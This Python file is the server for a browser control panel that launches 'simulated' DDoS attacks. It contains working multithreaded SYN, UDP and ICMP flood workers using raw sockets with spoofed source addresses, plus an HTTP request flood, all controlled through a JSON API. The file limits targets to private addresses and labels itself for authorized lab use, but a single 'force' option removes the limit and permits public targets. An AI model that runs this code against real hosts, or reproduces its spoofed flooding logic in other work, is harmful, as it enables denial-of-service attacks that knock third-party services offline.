#!/usr/bin/env python3
"""
server.py - Web control panel (frontend) for the DDoS simulator.

Serves a browser dashboard (index.html) and a small JSON API so you can launch
and stop simulated attacks with buttons instead of the command line, and watch
the live packet rate in a chart.

Run on the ATTACKER machine:
    sudo python3 ddos-simulator/webui/server.py            # listens on 0.0.0.0:5000
    sudo python3 ddos-simulator/webui/server.py 0.0.0.0 5000
Then open http://<attacker-ip>:5000/ in a browser.

(sudo is needed for syn/udp/icmp raw-socket modes; http mode works without it.)

============================ AUTHORIZED USE ONLY ============================
Only target a machine you own on an isolated network. See ddos_simulator.py.
===========================================================================
"""
import json
import os
import random
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Reuse the (tested) packet-building helpers from the CLI simulator.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ddos_simulator import (  # noqa: E402
    random_ip, ip_header, tcp_syn_segment, icmp_echo, is_private,
)

HERE = os.path.dirname(os.path.abspath(__file__))


def local_ip_for(target: str) -> str:
    """Best-effort local source IP used when spoofing is disabled."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


class AttackController:
    """Owns the worker threads and live counters for one attack run."""

    def __init__(self):
        self.lock = threading.Lock()
        self._reset()

    def _reset(self):
        self.stop_flag = threading.Event()
        self.threads = []
        self.packets = 0
        self.running = False
        self.error = None
        self.config = {}
        self.start_time = None
        self.end_time = None
        self.history = []      # last 60 per-second rates (for the chart)
        self._last_count = 0
        self.local_ip = "127.0.0.1"

    def bump(self, n=1):
        with self.lock:
            self.packets += n

    # ---- lifecycle ----------------------------------------------------
    def start(self, cfg):
        if self.running:
            return False, "an attack is already running"
        try:
            socket.inet_aton(cfg["target"])
        except OSError:
            return False, "target must be a valid IPv4 address"
        if not is_private(cfg["target"]) and not cfg.get("force"):
            return False, ("refusing non-private target — enable 'Force' only "
                           "if you are authorized to test it")

        self._reset()
        self.running = True
        self.config = cfg
        self.start_time = time.time()
        self.local_ip = local_ip_for(cfg["target"])
        mode = cfg["mode"]
        spoof = cfg.get("spoof", True) and mode != "http"

        for _ in range(cfg["threads"]):
            if mode == "http":
                t = threading.Thread(target=self._http_worker,
                                     args=(cfg["target"], cfg["port"], cfg["pps"]),
                                     daemon=True)
            else:
                t = threading.Thread(target=self._raw_worker,
                                     args=(cfg["target"], cfg["port"], mode,
                                           spoof, cfg["pps"]), daemon=True)
            t.start()
            self.threads.append(t)

        threading.Thread(target=self._monitor, args=(cfg["duration"],),
                         daemon=True).start()
        return True, "attack started"

    def stop(self):
        self.stop_flag.set()
        if self.running:
            self.end_time = time.time()
        self.running = False

    def _monitor(self, duration):
        """Sample the send rate every second; auto-stop when duration elapses."""
        while self.running and not self.stop_flag.is_set():
            time.sleep(1)
            with self.lock:
                rate = self.packets - self._last_count
                self._last_count = self.packets
                self.history.append(rate)
                if len(self.history) > 60:
                    self.history.pop(0)
            if duration and (time.time() - self.start_time) >= duration:
                self.stop()
                break

    def stats(self):
        with self.lock:
            if self.start_time is None:
                elapsed = 0.0
            elif self.running:
                elapsed = time.time() - self.start_time
            else:
                elapsed = (self.end_time or self.start_time) - self.start_time
            return {
                "running": self.running,
                "packets": self.packets,
                "rate": self.history[-1] if self.history else 0,
                "elapsed": round(elapsed, 1),
                "history": list(self.history),
                "config": self.config,
                "error": self.error,
            }

    # ---- workers ------------------------------------------------------
    def _raw_worker(self, target, port, mode, spoof, pps):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            self.error = ("raw sockets need root — restart the panel with "
                          "sudo, or use HTTP mode")
            self.stop_flag.set()
            self.running = False
            return

        payload = b"x" * 32
        interval = 1.0 / pps if pps else 0
        while not self.stop_flag.is_set():
            src = random_ip() if spoof else self.local_ip
            sport = random.randint(1024, 65535)
            if mode == "syn":
                pkt = ip_header(src, target, socket.IPPROTO_TCP, 20) \
                    + tcp_syn_segment(src, target, sport, port)
            elif mode == "udp":
                udp = struct.pack("!HHHH", sport, port,
                                  8 + len(payload), 0) + payload
                pkt = ip_header(src, target, socket.IPPROTO_UDP, len(udp)) + udp
            else:  # icmp
                icmp = icmp_echo(payload)
                pkt = ip_header(src, target, socket.IPPROTO_ICMP,
                                len(icmp)) + icmp
            try:
                sock.sendto(pkt, (target, 0))
                self.bump()
            except OSError:
                pass
            if interval:
                time.sleep(interval)

    def _http_worker(self, target, port, pps):
        request = ("GET / HTTP/1.1\r\nHost: %s\r\n"
                   "User-Agent: ddos-sim\r\n\r\n" % target).encode()
        interval = 1.0 / pps if pps else 0
        while not self.stop_flag.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.sendall(request)
                self.bump()
                s.close()
            except OSError:
                self.bump()
            if interval:
                time.sleep(interval)


controller = AttackController()


class Handler(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="application/json"):
        data = body if isinstance(body, bytes) else body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            try:
                with open(os.path.join(HERE, "index.html"), "rb") as f:
                    self._send(200, f.read(), "text/html; charset=utf-8")
            except OSError:
                self._send(500, json.dumps({"error": "index.html missing"}))
        elif self.path == "/api/stats":
            self._send(200, json.dumps(controller.stats()))
        else:
            self._send(404, json.dumps({"error": "not found"}))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b"{}"
        try:
            data = json.loads(raw or b"{}")
        except ValueError:
            data = {}

        if self.path == "/api/start":
            cfg = {
                "target": str(data.get("target", "")).strip(),
                "mode": data.get("mode", "syn"),
                "port": int(data.get("port", 80)),
                "threads": max(1, min(64, int(data.get("threads", 4)))),
                "duration": max(0, int(data.get("duration", 20))),
                "pps": max(0, int(data.get("pps", 0))),
                "spoof": bool(data.get("spoof", True)),
                "force": bool(data.get("force", False)),
            }
            ok, msg = controller.start(cfg)
            self._send(200 if ok else 400, json.dumps({"ok": ok, "message": msg}))
        elif self.path == "/api/stop":
            controller.stop()
            self._send(200, json.dumps({"ok": True, "message": "stopped"}))
        else:
            self._send(404, json.dumps({"error": "not found"}))

    def log_message(self, *args):
        pass  # keep the console quiet


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    srv = ThreadingHTTPServer((host, port), Handler)
    print("DDoS simulator control panel running at http://%s:%d/" % (host, port))
    print("Open it in a browser. Press Ctrl-C to stop.")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        controller.stop()
        print("\nstopped.")


if __name__ == "__main__":
    main()
